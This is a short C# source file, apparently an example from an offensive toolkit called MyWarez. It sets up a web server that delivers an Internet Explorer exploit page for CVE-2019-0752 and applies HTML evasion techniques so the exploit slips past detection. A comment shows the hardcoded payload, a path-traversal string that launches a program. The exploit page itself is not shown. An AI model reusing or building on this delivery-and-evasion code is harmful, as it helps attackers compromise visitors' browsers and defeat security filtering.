using MyWarez.Core;
using MyWarez.Plugins.Htmlmth;
using System.Collections.Generic;
using System.IO;

namespace Examples
{
    public static class Baseline
    {
        public static HtmlmthWebsite Create(string host)
        {
            // This is the baseline's payload. It is hardcoded in the baseline resource   
            // Payload = "\..\..\..\..\..\PROGRA~2\INTERN~1\iexplore.exe 0D15EA5E"
            var baselineResourceName = "CVE-2019-0752_internetexplorer.html";
            var baselineResourcePath = Path.Join(MyWarez.Core.Constants.ResourceDirectory, baselineResourceName);
            var baselineHtml = File.ReadAllText(baselineResourcePath);
            var baselineWebsite = new Website(new List<WebsiteResource>() { new WebsiteResource(baselineHtml, "/") });
            var baselineHtmlmthWebsite = new HtmlmthWebsite(baselineWebsite, host);
            return baselineHtmlmthWebsite;
        }
    }

    public static class Evasion
    {
        public static IAttack Create(string name, string hostname, IEnumerable<string> evasions)
        {
            var HOST = Host.GetHostByHostName(hostname) ?? new Host(hostname, hostname, null);
            var htmlmthServerOutput = new HtmlmthServerOutput(HOST);
            var attack = new Attack(new IOutput[] { htmlmthServerOutput }, name: name);
            var baseline = Baseline.Create(HOST);
            baseline.SetEvasions(evasions);
            htmlmthServerOutput.Add(baseline);
            return attack;
        }
    }
}
